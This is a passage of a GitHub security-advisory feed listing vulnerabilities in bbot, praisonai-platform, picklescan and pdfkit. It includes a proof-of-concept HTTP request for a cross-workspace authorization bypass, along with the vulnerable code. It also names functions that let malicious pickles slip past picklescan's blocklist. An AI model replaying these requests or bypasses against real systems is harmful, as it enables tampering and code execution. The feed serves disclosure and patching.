        <content type="html"><![CDATA[<p>The <code>postman_download</code> module uses the workspace <code>name</code> field from the Postman API to construct the local directory path without sanitization. If a malicious workspace has a name containing path traversal characters, pathlib resolves the path outside the intended output directory, allowing an attacker to write arbitrary files to the user's system.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/blacklanternsecurity/bbot/security/advisories/GHSA-m54h-vhf9-3w3m">https://github.com/blacklanternsecurity/bbot/security/advisories/GHSA-m54h-vhf9-3w3m</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-12568">https://nvd.nist.gov/vuln/detail/CVE-2026-12568</a></li>
<li><a href="https://github.com/blacklanternsecurity/bbot/commit/36bc20818">https://github.com/blacklanternsecurity/bbot/commit/36bc20818</a></li>
<li><a href="https://github.com/advisories/GHSA-m54h-vhf9-3w3m">https://github.com/advisories/GHSA-m54h-vhf9-3w3m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m54h-vhf9-3w3m</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-18T15:03:38.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[bbot] BBOT: Server-Side Request Forgery (SSRF) in docker_pull module via WWW-Authenticate realm parsing]]></title>
        <id>https://github.com/advisories/GHSA-3mp7-vp6j-2mxx</id>
        <link href="https://github.com/advisories/GHSA-3mp7-vp6j-2mxx"/>
        <updated>2026-06-18T15:03:26.000Z</updated>
        <content type="html"><![CDATA[<p>The <code>docker_pull</code> module uses the <code>realm</code> parameter from a Docker registry's <code>WWW-Authenticate</code> response header as the authentication endpoint without validation. An attacker in a man-in-the-middle position between bbot and a Docker registry could modify this header to redirect the authentication request to an arbitrary endpoint, potentially leaking authentication tokens.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/blacklanternsecurity/bbot/security/advisories/GHSA-3mp7-vp6j-2mxx">https://github.com/blacklanternsecurity/bbot/security/advisories/GHSA-3mp7-vp6j-2mxx</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-12566">https://nvd.nist.gov/vuln/detail/CVE-2026-12566</a></li>
<li><a href="https://github.com/blacklanternsecurity/bbot/commit/c2f4bc0f4">https://github.com/blacklanternsecurity/bbot/commit/c2f4bc0f4</a></li>
<li><a href="https://github.com/advisories/GHSA-3mp7-vp6j-2mxx">https://github.com/advisories/GHSA-3mp7-vp6j-2mxx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3mp7-vp6j-2mxx</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-06-18T15:03:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[bbot] BBOT: Path traversal (Zip-Slip) in unarchive module - incomplete fix for CVE-2025-10284]]></title>
        <id>https://github.com/advisories/GHSA-3vgw-585j-4m45</id>
        <link href="https://github.com/advisories/GHSA-3vgw-585j-4m45"/>
        <updated>2026-06-18T15:02:35.000Z</updated>
        <content type="html"><![CDATA[<p>The <code>unarchive</code> internal module's archive extraction commands perform no code-level validation on extracted file paths, relying entirely on the behavior of external tools (e.g. GNU tar) which varies by platform. While CVE-2025-10284 addressed git-specific RCE vectors, the underlying archive extraction path traversal was never fixed. On systems with GNU tar &lt; 1.34 (Ubuntu 20.04, Debian Buster, CentOS 7, many Docker base images), a malicious archive can write files outside the intended extraction directory.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/blacklanternsecurity/bbot/security/advisories/GHSA-3vgw-585j-4m45">https://github.com/blacklanternsecurity/bbot/security/advisories/GHSA-3vgw-585j-4m45</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-12565">https://nvd.nist.gov/vuln/detail/CVE-2026-12565</a></li>
<li><a href="https://github.com/blacklanternsecurity/bbot/commit/4fb38fd6e">https://github.com/blacklanternsecurity/bbot/commit/4fb38fd6e</a></li>
<li><a href="https://github.com/advisories/GHSA-3vgw-585j-4m45">https://github.com/advisories/GHSA-3vgw-585j-4m45</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3vgw-585j-4m45</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-18T15:02:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[praisonai-platform] praisonai-platform: Authorization Bypass Through User-Controlled Key]]></title>
        <id>https://github.com/advisories/GHSA-2fjj-qqg8-fg7x</id>
        <link href="https://github.com/advisories/GHSA-2fjj-qqg8-fg7x"/>
        <updated>2026-06-18T14:48:36.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The issue create and update endpoints in <code>praisonai-platform</code> accept a <code>project_id</code> in the request body and persist it without validating that the project belongs to the URL workspace. A user who is a member of workspace <code>W_B</code> (and has no access to workspace <code>W_A</code>) can create issues that reference a project owned by <code>W_A</code>. Because <code>ProjectService.get_stats()</code> aggregates issues by <code>project_id</code> with no workspace constraint, those foreign issues are then counted in the victim's own legitimate view of their project statistics. This is a cross-tenant integrity violation reachable by an outsider.</p>
<p>This is distinct from the path-parameter IDOR family fixed in 0.1.4 (CVE-2026-47415, CVE-2026-47418, CVE-2026-47419). Those fixes scoped object references supplied in the URL path. This report concerns an object reference supplied in the request body at write time, which the 0.1.4 fixes did not cover.</p>
<p>Version 0.1.4 fixed a set of path-parameter IDORs by threading <code>workspace_id</code> into the service-layer lookups (<code>get</code> / <code>update</code> / <code>delete</code>) and by adding the helpers <code>ensure_resource_in_workspace()</code> and <code>require_issue_in_workspace()</code> in <code>api/deps.py</code>. Those helpers are applied to object references that arrive in the URL path. They are not applied to object references that arrive in the request body on create or update.</p>
<h2 id="details">Details</h2>
<p><code>api/routes/issues.py</code>, <code>create_issue</code> passes the body's <code>project_id</code> straight through with no workspace validation:</p>
<pre><code class="language-python">@router.post("/", response_model=IssueResponse, status_code=201)
async def create_issue(workspace_id: str, body: IssueCreate,
                       user=Depends(require_workspace_member), session=Depends(get_db)):
    svc = IssueService(session)
    issue = await svc.create(
        workspace_id=workspace_id,
        title=body.title,
        creator_id=user.id,
        project_id=body.project_id,        # attacker-controlled, not validated against workspace_id
        ...
    )
</code></pre>
<p><code>services/issue_service.py</code>, <code>create</code> persists it as-is:</p>
<pre><code class="language-python">issue = Issue(
    workspace_id=workspace_id,
    project_id=project_id,                 # no check that project_id belongs to workspace_id
    ...
)
</code></pre>
<p><code>services/issue_service.py</code>, <code>update</code> has the identical gap on the update path:</p>
<pre><code class="language-python">if project_id is not None:
    issue.project_id = project_id          # re-parent to any project, no workspace check
</code></pre>
<p><code>services/project_service.py</code>, <code>get_stats</code> aggregates by <code>project_id</code> only:</p>
<pre><code class="language-python">async def get_stats(self, project_id: str) -&gt; dict:
    stmt = (
        select(Issue.status, func.count(Issue.id))
        .where(Issue.project_id == project_id)   # no workspace_id constraint
        .group_by(Issue.status)
    )
    ...
</code></pre>
<p>Note that the read path is not directly vulnerable. The stats route scopes the project first, so a cross-workspace stats read returns 404:</p>
<pre><code class="language-python">@router.get("/{project_id}/stats")
async def project_stats(workspace_id, project_id, user=Depends(require_workspace_member), ...):
    project = await svc.get(project_id, workspace_id=workspace_id)   # 404 for a foreign project
    if project is None:
        raise HTTPException(404, "Project not found")
    return await svc.get_stats(project_id)
</code></pre>
<p>The pollution therefore enters through the write side (issue create/update accepting a foreign <code>project_id</code>) and surfaces in the victim's own legitimate read of their project statistics.</p>
<h2 id="proof-of-concept">Proof of concept</h2>
<p>Two unrelated users:</p>
<ul>
<li>Alice, member of workspace <code>W_A</code>, owns project <code>P_A</code>.</li>
<li>Bob, member of workspace <code>W_B</code> only. Bob has no access to <code>W_A</code> (every direct call to <code>W_A</code> resources returns 403).</li>
</ul>
<p>Steps:</p>
<ol>
<li><p>Alice's project <code>P_A</code> has one in-progress issue.
<code>GET /workspaces/W_A/projects/P_A/stats</code> returns <code>{"total": 1, "by_status": {"in_progress": 1}}</code>.</p>
</li>
<li><p>Bob creates issues in his own workspace that reference Alice's project. Repeat 7 times:</p>
<pre><code class="language-http">POST /workspaces/W_B/issues
Authorization: Bearer &lt;Bob's token&gt;
Content-Type: application/json

{"title": "x", "project_id": "P_A", "status": "done"}
</code></pre>
<p>Each returns 201. Each issue is stored with <code>workspace_id = W_B</code> and <code>project_id = P_A</code>.</p>
</li>
<li><p>Alice reads her own project stats:
<code>GET /workspaces/W_A/projects/P_A/stats</code> now returns
<code>{"total": 8, "by_status": {"done": 7, "in_progress": 1}}</code>.</p>
</li>
</ol>
<p>Bob is not a member of <code>W_A</code>, yet data he wrote appears in Alice's project dashboard.</p>
<h2 id="impact">Impact</h2>
<p>An unauthorized outsider can inflate or skew the issue counts shown in any workspace's project-statistics view, given only the target <code>project_id</code> (a UUID that can be harvested or guessed). The effect is limited to the statistics aggregation; it does not expose the victim's issue contents to the attacker and does not appear in the victim's workspace-scoped issue list. The same unvalidated write path also accepts cross-workspace <code>parent_issue_id</code> and <code>assignee_id</code> values, which have no aggregation read endpoint today but represent the same dangling cross-workspace reference class and should be fixed together.</p>
<h2 id="suggested-fix">Suggested fix</h2>
<p>On both issue create and update, validate that any body-supplied object reference resolves within the URL workspace before persisting, reusing the existing pattern:</p>
<pre><code class="language-python">if body.project_id is not None:
    project = await ProjectService(session).get(body.project_id, workspace_id=workspace_id)
    if project is None:
        raise HTTPException(404, "Project not found")
</code></pre>
<p>Apply the same check to <code>parent_issue_id</code> (via <code>require_issue_in_workspace</code>) and to <code>assignee_id</code>. As defense in depth, scope <code>get_stats</code> so it only counts issues whose <code>workspace_id</code> matches the project's workspace.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-2fjj-qqg8-fg7x">https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-2fjj-qqg8-fg7x</a></li>
<li><a href="https://github.com/advisories/GHSA-2fjj-qqg8-fg7x">https://github.com/advisories/GHSA-2fjj-qqg8-fg7x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2fjj-qqg8-fg7x</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-18T14:48:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[picklescan] Duplicate Advisory: picklescan has Arbitrary file read using `io.FileIO` ]]></title>
        <id>https://github.com/advisories/GHSA-5v23-73v4-w2fp</id>
        <link href="https://github.com/advisories/GHSA-5v23-73v4-w2fp"/>
        <updated>2026-06-18T14:46:11.000Z</updated>
        <content type="html"><![CDATA[<h3 id="duplicate-advisory">Duplicate Advisory</h3>
<p>This advisory has been withdrawn because it is a duplicate of GHSA-9726-w42j-3qjr. This link is maintained to preserve external references.</p>
<h3 id="original-description">Original Description</h3>
<p>picklescan before 0.0.35 contains an unsafe pickle deserialization vulnerability allowing unauthenticated attackers to read arbitrary server files by chaining io.FileIO and urllib.request.urlopen. Attackers can bypass RCE-focused blocklists to exfiltrate sensitive data like /etc/passwd to external servers.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mmaitre314/picklescan/security/advisories/GHSA-9726-w42j-3qjr">https://github.com/mmaitre314/picklescan/security/advisories/GHSA-9726-w42j-3qjr</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-53872">https://nvd.nist.gov/vuln/detail/CVE-2026-53872</a></li>
<li><a href="https://www.vulncheck.com/advisories/picklescan-arbitrary-file-read-via-unsafe-pickle-deserialization">https://www.vulncheck.com/advisories/picklescan-arbitrary-file-read-via-unsafe-pickle-deserialization</a></li>
<li><a href="https://github.com/advisories/GHSA-5v23-73v4-w2fp">https://github.com/advisories/GHSA-5v23-73v4-w2fp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5v23-73v4-w2fp</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-17T18:35:57.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[picklescan] Duplicate Advisory: PickleScan's pkgutil.resolve_name has a universal blocklist bypass]]></title>
        <id>https://github.com/advisories/GHSA-82fg-2r99-h7v6</id>
        <link href="https://github.com/advisories/GHSA-82fg-2r99-h7v6"/>
        <updated>2026-06-18T14:45:21.000Z</updated>
        <content type="html"><![CDATA[<h3 id="duplicate-advisory">Duplicate Advisory</h3>
<p>This advisory has been withdrawn because it is a duplicate of GHSA-vvpj-8cmc-gx39. This link is maintained to preserve external references.</p>
<h3 id="original-description">Original Description</h3>
<p>picklescan before 1.0.4 fails to block pkgutil.resolve_name, allowing attackers to bypass the entire blocklist by resolving any dangerous function through indirect REDUCE calls. Remote attackers can invoke any blocked function such as os.system, builtins.exec, or subprocess.call to achieve remote code execution.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mmaitre314/picklescan/security/advisories/GHSA-vvpj-8cmc-gx39">https://github.com/mmaitre314/picklescan/security/advisories/GHSA-vvpj-8cmc-gx39</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-3490">https://nvd.nist.gov/vuln/detail/CVE-2026-3490</a></li>
<li><a href="https://www.vulncheck.com/advisories/picklescan-universal-blocklist-bypass-via-pkgutil-resolve-name">https://www.vulncheck.com/advisories/picklescan-universal-blocklist-bypass-via-pkgutil-resolve-name</a></li>
<li><a href="https://github.com/advisories/GHSA-82fg-2r99-h7v6">https://github.com/advisories/GHSA-82fg-2r99-h7v6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-82fg-2r99-h7v6</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-06-17T18:35:57.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[picklescan] Duplicate Advisory: Picklescan does not block ctypes]]></title>
        <id>https://github.com/advisories/GHSA-7f79-rvx6-vxc4</id>
        <link href="https://github.com/advisories/GHSA-7f79-rvx6-vxc4"/>
        <updated>2026-06-18T14:44:46.000Z</updated>
        <content type="html"><![CDATA[<h3 id="duplicate-advisory">Duplicate Advisory</h3>
<p>This advisory has been withdrawn because it is a duplicate of GHSA-4675-36f9-wf6r. This link is maintained to preserve external references.</p>
<h3 id="original-description">Original Description</h3>
<p>picklescan before 0.0.33 fails to block the ctypes module, allowing attackers to achieve remote code execution by invoking direct syscalls and accessing raw memory. Attackers can craft malicious pickle files using ctypes.WinDLL to load kernel32.dll and execute arbitrary commands, bypassing sandbox protections and gadget chain detection.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mmaitre314/picklescan/security/advisories/GHSA-4675-36f9-wf6r">https://github.com/mmaitre314/picklescan/security/advisories/GHSA-4675-36f9-wf6r</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-71323">https://nvd.nist.gov/vuln/detail/CVE-2025-71323</a></li>
<li><a href="https://www.vulncheck.com/advisories/picklescan-remote-code-execution-via-unblocked-ctypes-module">https://www.vulncheck.com/advisories/picklescan-remote-code-execution-via-unblocked-ctypes-module</a></li>
<li><a href="https://github.com/advisories/GHSA-7f79-rvx6-vxc4">https://github.com/advisories/GHSA-7f79-rvx6-vxc4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7f79-rvx6-vxc4</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-06-17T18:35:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[picklescan] Duplicate Advisory: Picklescan vulnerable to Arbitrary File Writing]]></title>
        <id>https://github.com/advisories/GHSA-rmpp-8wf5-xx5q</id>
        <link href="https://github.com/advisories/GHSA-rmpp-8wf5-xx5q"/>
        <updated>2026-06-18T14:44:11.000Z</updated>
        <content type="html"><![CDATA[<h3 id="duplicate-advisory">Duplicate Advisory</h3>
<p>This advisory has been withdrawn because it is a duplicate of GHSA-m273-6v24-x4m4. This link is maintained to preserve external references.</p>
<h3 id="original-description">Original Description</h3>
<p>picklescan before 0.0.33 contains an arbitrary file writing vulnerability that allows attackers to bypass the dangerous blocklist by using distutils.file_util.write_file. Attackers can construct malicious pickle objects to overwrite critical system files and achieve denial of service or remote code execution.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mmaitre314/picklescan/security/advisories/GHSA-m273-6v24-x4m4">https://github.com/mmaitre314/picklescan/security/advisories/GHSA-m273-6v24-x4m4</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-71321">https://nvd.nist.gov/vuln/detail/CVE-2025-71321</a></li>
<li><a href="https://www.vulncheck.com/advisories/picklescan-arbitrary-file-writing-via-distutils-module-bypass">https://www.vulncheck.com/advisories/picklescan-arbitrary-file-writing-via-distutils-module-bypass</a></li>
<li><a href="https://github.com/advisories/GHSA-rmpp-8wf5-xx5q">https://github.com/advisories/GHSA-rmpp-8wf5-xx5q</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rmpp-8wf5-xx5q</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-06-17T18:35:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[picklescan] Duplicate Advisory: Picklescan (scan_pytorch) Bypass via dynamic eval MAGIC_NUMBER]]></title>
        <id>https://github.com/advisories/GHSA-cc5p-54x3-hcf8</id>
        <link href="https://github.com/advisories/GHSA-cc5p-54x3-hcf8"/>
        <updated>2026-06-18T14:43:35.000Z</updated>
        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
<p>This advisory has been withdrawn because it is a duplicate of&nbsp;GHSA-97f8-7cmv-76j2. This link is maintained to preserve external references.</p>
<h2 id="original-description">Original Description</h2>
<p>picklescan before 1.0.3 contains a scanning bypass vulnerability in the scan_pytorch function that allows attackers to embed malicious magic numbers via dynamic eval using the <strong>reduce</strong> trick. Attackers can craft malicious PyTorch payloads that evade picklescan detection while remaining executable, enabling arbitrary code execution when loaded with torch.load().</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mmaitre314/picklescan/security/advisories/GHSA-97f8-7cmv-76j2">https://github.com/mmaitre314/picklescan/security/advisories/GHSA-97f8-7cmv-76j2</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-53875">https://nvd.nist.gov/vuln/detail/CVE-2026-53875</a></li>
<li><a href="https://github.com/mmaitre314/picklescan/commit/134179474539648ba7dee1317959529fbd0e7f89">https://github.com/mmaitre314/picklescan/commit/134179474539648ba7dee1317959529fbd0e7f89</a></li>
<li><a href="https://github.com/mmaitre314/picklescan/commit/2a8383cfeb4158567f9770d86597300c9e508d0f">https://github.com/mmaitre314/picklescan/commit/2a8383cfeb4158567f9770d86597300c9e508d0f</a></li>
<li><a href="https://www.vulncheck.com/advisories/picklescan-scanning-bypass-via-dynamic-eval-in-scan-pytorch">https://www.vulncheck.com/advisories/picklescan-scanning-bypass-via-dynamic-eval-in-scan-pytorch</a></li>
<li><a href="https://github.com/advisories/GHSA-cc5p-54x3-hcf8">https://github.com/advisories/GHSA-cc5p-54x3-hcf8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cc5p-54x3-hcf8</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-17T18:35:57.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[picklescan] Duplicate Advisory: PickleScan's profile.run blocklist mismatch allows exec() bypass]]></title>
        <id>https://github.com/advisories/GHSA-4mpj-78p6-rj59</id>
        <link href="https://github.com/advisories/GHSA-4mpj-78p6-rj59"/>
        <updated>2026-06-18T14:43:10.000Z</updated>
        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
<p>This advisory has been withdrawn because it is a duplicate of GHSA-7wx9-6375-f5wh. This link is maintained to preserve external references.</p>
<h2 id="original-description">Original Description</h2>
<p>picklescan before 1.0.4 contains an incomplete blocklist for the profile module that fails to block the module-level profile.run() function, allowing attackers to achieve arbitrary code execution via exec(). Attackers can craft malicious pickle files calling profile.run(statement) to execute arbitrary Python code while picklescan reports zero security issues.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mmaitre314/picklescan/security/advisories/GHSA-7wx9-6375-f5wh">https://github.com/mmaitre314/picklescan/security/advisories/GHSA-7wx9-6375-f5wh</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-53873">https://nvd.nist.gov/vuln/detail/CVE-2026-53873</a></li>
<li><a href="https://www.vulncheck.com/advisories/picklescan-arbitrary-code-execution-via-profile-run-blocklist-bypass">https://www.vulncheck.com/advisories/picklescan-arbitrary-code-execution-via-profile-run-blocklist-bypass</a></li>
<li><a href="https://github.com/advisories/GHSA-4mpj-78p6-rj59">https://github.com/advisories/GHSA-4mpj-78p6-rj59</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4mpj-78p6-rj59</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-06-17T18:35:57.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[picklescan] Duplicate Advisory: picklescan missing detection by simple obfuscation of a `builtins.eval` call]]></title>
        <id>https://github.com/advisories/GHSA-j6c9-qvp8-699f</id>
        <link href="https://github.com/advisories/GHSA-j6c9-qvp8-699f"/>
        <updated>2026-06-18T14:41:47.000Z</updated>
        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
<p>This advisory has been withdrawn because it is a duplicate of&nbsp;GHSA-9m3x-qqw2-h32h. This link is maintained to preserve external references.</p>
<h2 id="original-description">Original Description</h2>
<p>picklescan before 1.0.1 contains an unsafe deserialization vulnerability allowing unauthenticated users to execute arbitrary code by hiding eval calls nested under callable objects via getattr. Attackers can embed malicious code in pickle files that evades detection but executes when the pickle is loaded from untrusted sources.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mmaitre314/picklescan/security/advisories/GHSA-9m3x-qqw2-h32h">https://github.com/mmaitre314/picklescan/security/advisories/GHSA-9m3x-qqw2-h32h</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-53874">https://nvd.nist.gov/vuln/detail/CVE-2026-53874</a></li>
<li><a href="https://www.vulncheck.com/advisories/picklescan-arbitrary-code-execution-via-obfuscated-eval-call">https://www.vulncheck.com/advisories/picklescan-arbitrary-code-execution-via-obfuscated-eval-call</a></li>
<li><a href="https://github.com/advisories/GHSA-j6c9-qvp8-699f">https://github.com/advisories/GHSA-j6c9-qvp8-699f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j6c9-qvp8-699f</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-06-17T18:35:57.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[picklescan] Duplicate Advisory: Picklescan Bypasses Unsafe Globals Check using pty.spawn]]></title>
        <id>https://github.com/advisories/GHSA-5gp7-4733-2w2v</id>
        <link href="https://github.com/advisories/GHSA-5gp7-4733-2w2v"/>
        <updated>2026-06-18T14:41:21.000Z</updated>
        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
<p>This advisory has been withdrawn because it is a duplicate of&nbsp;GHSA-hgrh-qx5j-jfwx. This link is maintained to preserve external references.</p>
<h2 id="original-description">Original Description</h2>
<p>PickleScan before 0.0.33 fails to include the pty.spawn function in its unsafe globals list, allowing attackers to bypass security checks. Malicious actors can craft pickle payloads using pty.spawn to achieve arbitrary code execution when files are processed by PickleScan.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mmaitre314/picklescan/security/advisories/GHSA-hgrh-qx5j-jfwx">https://github.com/mmaitre314/picklescan/security/advisories/GHSA-hgrh-qx5j-jfwx</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-71322">https://nvd.nist.gov/vuln/detail/CVE-2025-71322</a></li>
<li><a href="https://www.vulncheck.com/advisories/picklescan-unsafe-globals-check-bypass-via-pty-spawn-function">https://www.vulncheck.com/advisories/picklescan-unsafe-globals-check-bypass-via-pty-spawn-function</a></li>
<li><a href="https://github.com/advisories/GHSA-5gp7-4733-2w2v">https://github.com/advisories/GHSA-5gp7-4733-2w2v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5gp7-4733-2w2v</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-17T18:35:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[picklescan] Duplicate Advisory: Picklescan has pickle parsing logic flaw that leads to malicious pickle file bypass]]></title>
        <id>https://github.com/advisories/GHSA-5rph-q42j-36j9</id>
        <link href="https://github.com/advisories/GHSA-5rph-q42j-36j9"/>
        <updated>2026-06-18T14:40:55.000Z</updated>
        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
<p>This advisory has been withdrawn because it is a duplicate of&nbsp;GHSA-9gvj-pp9x-gcfr. This link is maintained to preserve external references.</p>
<h2 id="original-description">Original Description</h2>
<p>picklescan before 0.0.27 contains a parsing logic error in the _list_globals function when handling STACK_GLOBAL opcodes, failing to track arguments in the correct range and allowing malicious pickle files to bypass detection. Attackers can craft pickle files with arguments at position zero to trigger unexpected exceptions and evade security scanning.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mmaitre314/picklescan/security/advisories/GHSA-9gvj-pp9x-gcfr">https://github.com/mmaitre314/picklescan/security/advisories/GHSA-9gvj-pp9x-gcfr</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-71325">https://nvd.nist.gov/vuln/detail/CVE-2025-71325</a></li>
<li><a href="https://github.com/mmaitre314/picklescan/commit/2a8383cfeb4158567f9770d86597300c9e508d0f">https://github.com/mmaitre314/picklescan/commit/2a8383cfeb4158567f9770d86597300c9e508d0f</a></li>
<li><a href="https://www.vulncheck.com/advisories/picklescan-detection-bypass-via-stack-global-opcode-parsing-logic-flaw">https://www.vulncheck.com/advisories/picklescan-detection-bypass-via-stack-global-opcode-parsing-logic-flaw</a></li>
<li><a href="https://github.com/advisories/GHSA-5rph-q42j-36j9">https://github.com/advisories/GHSA-5rph-q42j-36j9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5rph-q42j-36j9</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-06-17T18:35:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[picklescan] Duplicate Advisory: Picklescan has Incomplete List of Disallowed Inputs]]></title>
        <id>https://github.com/advisories/GHSA-6v84-v468-3c7f</id>
        <link href="https://github.com/advisories/GHSA-6v84-v468-3c7f"/>
        <updated>2026-06-18T14:40:26.000Z</updated>
        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
<p>This advisory has been withdrawn because it is a duplicate of&nbsp;GHSA-84r2-jw7c-4r5q. This link is maintained to preserve external references.</p>
<h2 id="original-description">Original Description</h2>
<p>picklescan before 0.0.33 contains an incomplete deny-list that fails to block pydoc.locate and operator.methodcaller functions, allowing attackers to bypass security checks. Remote attackers can craft malicious pickle files using these unblocked functions to achieve arbitrary code execution when the pickle is deserialized.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mmaitre314/picklescan/security/advisories/GHSA-84r2-jw7c-4r5q">https://github.com/mmaitre314/picklescan/security/advisories/GHSA-84r2-jw7c-4r5q</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-71320">https://nvd.nist.gov/vuln/detail/CVE-2025-71320</a></li>
<li><a href="https://www.vulncheck.com/advisories/picklescan-remote-code-execution-via-incomplete-disallowed-inputs">https://www.vulncheck.com/advisories/picklescan-remote-code-execution-via-incomplete-disallowed-inputs</a></li>
<li><a href="https://github.com/advisories/GHSA-6v84-v468-3c7f">https://github.com/advisories/GHSA-6v84-v468-3c7f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6v84-v468-3c7f</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-06-17T18:35:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pdfkit] pdfkit: Path traversal in from_string]]></title>
        <id>https://github.com/advisories/GHSA-9g3x-6x24-vf9f</id>
        <link href="https://github.com/advisories/GHSA-9g3x-6x24-vf9f"/>
        <updated>2026-06-18T14:38:10.000Z</updated>
        <content type="html"><![CDATA[<p>In JazzCore python-pdfkit 1.0.0, the from_string method enables the execution of JavaScript code within the context of the server application and the exfiltration of local files.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-26240">https://nvd.nist.gov/vuln/detail/CVE-2025-26240</a></li>
